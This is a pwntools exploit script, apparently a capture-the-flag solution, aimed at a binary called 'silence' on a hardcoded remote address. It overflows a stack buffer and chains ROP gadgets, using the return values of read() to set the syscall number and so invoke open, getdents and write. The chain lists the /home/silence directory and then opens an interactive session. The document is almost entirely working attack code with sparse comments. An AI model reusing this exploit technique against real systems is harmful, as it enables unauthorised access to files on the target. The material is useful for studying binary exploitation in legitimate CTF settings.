from pwn import *

elf = ELF("silence")

#p = elf.process()
p = remote("192.81.209.60", 2023)
raw_input("DEBUG")

pop_rdi = 0x00000000004012c3
pop_rsi = 0x00000000004012c1
syscall_ret = 0x000000000040119e
pop_rbp = 0x000000000040117d
mov_eax_0_leave_ret = 0x0000000000401255

payload = b"A"*16
payload += p64(0x404100)
#write ROP and /home/meobeo/a to data section
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(0x404108)
payload += p64(0)
payload += p64(syscall_ret)
#call mov eax,0 leave ret
payload += p64(mov_eax_0_leave_ret)

p.sendline(payload)

#call read(0,0x404100,1)=> control rax = 2 => call open
payload2 = p64(pop_rdi)
payload2 += p64(0)
payload2 += p64(pop_rsi)
payload2 += p64(0x404100)
payload2 += p64(0)
payload2 += p64(syscall_ret)
#call open("/home/silence/)
payload2 += p64(pop_rsi)
payload2 += p64(0)
payload2 += p64(0)
payload2 += p64(pop_rdi)
payload2 += p64(0x404258)
payload2 += p64(syscall_ret)
#setup for call read
payload2 += p64(pop_rbp)
payload2 += p64(0x404178)
payload2 += p64(mov_eax_0_leave_ret)
#call the second read => control rax = 78 => call getdents
payload2 += p64(pop_rdi)
payload2 += p64(0)
payload2 += p64(pop_rsi)
payload2 += p64(0x404100)
payload2 += p64(0)
payload2 += p64(syscall_ret)
#call getdents 
payload2 += p64(pop_rdi)
payload2 += p64(0x1)
payload2 += p64(pop_rsi)
payload2 += p64(0x404500)
payload2 += p64(0)
payload2 += p64(syscall_ret)
#setup for call read
payload2 += p64(pop_rbp)
payload2 += p64(0x4041f0)
payload2 += p64(mov_eax_0_leave_ret)
#call the third read => control rax = 1 => call write
payload2 += p64(pop_rdi)
payload2 += p64(0)
payload2 += p64(pop_rsi)
payload2 += p64(0x404100)
payload2 += p64(0)
payload2 += p64(syscall_ret)
#call write(0,buf,size)
payload2 += p64(pop_rdi)
payload2 += p64(0x0)
payload2 += p64(pop_rsi)
payload2 += p64(0x404500)
payload2 += p64(0)
payload2 += p64(syscall_ret)
payload2 += b"/home/silence"
#payload2 += b"/home/meobeo/1"


p.send(payload2)

sleep(2)
p.sendline(b"A")
sleep(2)
p.sendline(b"A"*77)
sleep(2)
p.sendline(b"")

print(p.recv())

p.interactive()
